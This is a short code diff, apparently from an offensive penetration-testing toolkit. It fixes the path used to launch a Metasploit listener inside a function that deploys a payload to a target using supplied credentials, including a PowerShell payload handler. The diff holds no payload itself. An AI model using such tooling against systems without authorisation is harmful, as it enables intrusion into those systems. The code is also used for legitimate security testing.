@@ -162,7 +162,7 @@ def deploy_hex2binary(ipaddr,port,username,password):
                 except: import pexpect
                 print_status("Starting the Metasploit listener...")
                 msf_path = meta_path()
-                child2 = pexpect.spawn("%s/msfconsole -r %s/meta_config\r\n\r\n" % (msf_path,setdir))
+                child2 = pexpect.spawn("%smsfconsole -r %s/meta_config\r\n\r\n" % (msf_path,setdir))
 
         # random executable name
         random_exe = generate_random_string(10,15)
@@ -214,7 +214,7 @@ def deploy_hex2binary(ipaddr,port,username,password):
                 try: reload(pexpect)
                 except: import pexpect
                 print_status("Starting the Metasploit listener...")
-                child2 = pexpect.spawn("%s/msfconsole -r %s/reports/powershell/powershell.rc" % (msf_path,setdir))
+                child2 = pexpect.spawn("%smsfconsole -r %s/reports/powershell/powershell.rc" % (msf_path,setdir))
                 print_status("Waiting for the listener to start first before we continue forward...")
                 print_status("Be patient, Metaploit takes a little bit to start...")
                 child2.expect("Starting the payload handler", timeout=30000)
